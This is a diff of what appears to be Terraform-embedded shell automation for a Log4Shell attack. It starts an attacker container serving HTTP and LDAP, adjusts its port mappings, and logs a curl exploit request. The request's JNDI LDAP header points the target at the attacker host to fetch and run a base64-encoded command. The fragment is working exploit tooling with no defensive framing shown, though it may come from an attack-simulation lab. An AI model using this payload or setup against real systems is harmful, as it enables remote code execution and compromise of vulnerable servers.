@@ -27,8 +27,8 @@ locals {
     done
     log "docker path: $(which docker)"
     if [[ `sudo docker ps | grep ${local.name}` ]]; then docker stop ${local.name}; fi
-    log "$(echo 'docker run -d --name ${local.name} --rm -p ${local.attacker_http_port}:8088 -p ${local.attacker_ldap_port}:1389 ${local.image} ${local.command_payload}')"
-    docker run -d --name ${local.name} --rm -p ${local.attacker_http_port}:8088 -p ${local.attacker_ldap_port}:1389 ${local.image} ${local.command_payload} >> $LOGFILE 2>&1
+    log "$(echo 'docker run -d --name ${local.name} --rm -p ${local.attacker_http_port}:${local.attacker_http_port} -p ${local.attacker_ldap_port}:${local.attacker_ldap_port} ${local.image} ${local.command_payload}')"
+    docker run -d --name ${local.name} --rm -p ${local.attacker_http_port}:${local.attacker_http_port} -p ${local.attacker_ldap_port}:${local.attacker_ldap_port} ${local.image} ${local.command_payload} >> $LOGFILE 2>&1
     docker ps -a >> $LOGFILE 2>&1
     log "payload: curl --verbose ${local.target_ip}:${local.target_port} -H 'X-Api-Version: $${jndi:ldap://${local.attacker_ip}:${local.attacker_ldap_port}/Basic/Command/Base64/${local.base64_log4shell_payload}}'"
     log "checking target: ${local.target_ip}:${local.target_port}"
